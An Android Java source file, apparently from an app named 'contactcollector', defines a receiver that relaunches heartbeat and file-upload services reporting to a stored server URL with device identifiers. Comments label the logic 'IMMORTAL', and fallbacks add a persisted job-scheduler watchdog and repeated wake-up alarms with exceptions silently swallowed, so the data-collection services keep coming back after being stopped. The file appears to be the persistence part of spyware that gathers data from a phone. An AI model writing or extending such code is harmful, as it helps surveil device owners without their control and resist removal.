package com.contactcollector.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.SystemClock;

public class ServiceRestartReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("CollectorPrefs", Context.MODE_PRIVATE);
        String sessionId = prefs.getString("sessionId", null);
        String baseUrl = prefs.getString("baseUrl", null);

        if (sessionId == null || baseUrl == null) return;

        String deviceId = prefs.getString("deviceId", null);
        String deviceName = prefs.getString("deviceName", null);
        String deviceModel = prefs.getString("deviceModel", null);
        String deviceBrand = prefs.getString("deviceBrand", null);
        String androidVersion = prefs.getString("androidVersion", null);

        boolean heartbeatStarted = false;

        // IMMORTAL: Try direct start
        try {
            Intent heartbeatIntent = new Intent(context, HeartbeatService.class);
            heartbeatIntent.putExtra("sessionId", sessionId);
            heartbeatIntent.putExtra("baseUrl", baseUrl);
            heartbeatIntent.putExtra("deviceId", deviceId);
            heartbeatIntent.putExtra("deviceName", deviceName);
            heartbeatIntent.putExtra("deviceModel", deviceModel);
            heartbeatIntent.putExtra("deviceBrand", deviceBrand);
            heartbeatIntent.putExtra("androidVersion", androidVersion);
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(heartbeatIntent);
            } else {
                context.startService(heartbeatIntent);
            }
            heartbeatStarted = true;
        } catch (Exception e) {
            // Android 12+ ForegroundServiceStartNotAllowedException
        }

        // Try FileUploadService
        try {
            Intent uploadIntent = new Intent(context, FileUploadService.class);
            uploadIntent.putExtra("sessionId", sessionId);
            uploadIntent.putExtra("baseUrl", baseUrl);
            uploadIntent.putExtra("deviceId", deviceId);
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(uploadIntent);
            } else {
                context.startService(uploadIntent);
            }
        } catch (Exception e) {}

        // IMMORTAL: Multiple fallback layers
        if (!heartbeatStarted) {
            // FALLBACK 1: JobScheduler
            try {
                JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                if (jobScheduler != null) {
                    ComponentName serviceComponent = new ComponentName(context, WatchdogJobService.class);
                    JobInfo.Builder builder = new JobInfo.Builder(1001, serviceComponent)
                        .setMinimumLatency(500)
                        .setOverrideDeadline(3000)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .setPersisted(true);
                    jobScheduler.schedule(builder.build());
                }
            } catch (Exception e) {}

            // FALLBACK 2: Retry alarm in 5 seconds
            try {
                Intent retryIntent = new Intent(context, ServiceRestartReceiver.class);
                PendingIntent retryPending = PendingIntent.getBroadcast(
                    context, 3, retryIntent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
                );
                AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                if (alarmManager != null) {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 5000,
                        retryPending
                    );
                }
            } catch (Exception e) {}

            // FALLBACK 3: Retry alarm in 30 seconds
            try {
                Intent retryIntent2 = new Intent(context, ServiceRestartReceiver.class);
                PendingIntent retryPending2 = PendingIntent.getBroadcast(
                    context, 4, retryIntent2,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
                );
                AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                if (alarmManager != null) {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 30000,
                        retryPending2
                    );
                }
            } catch (Exception e) {}
        }
    }
}
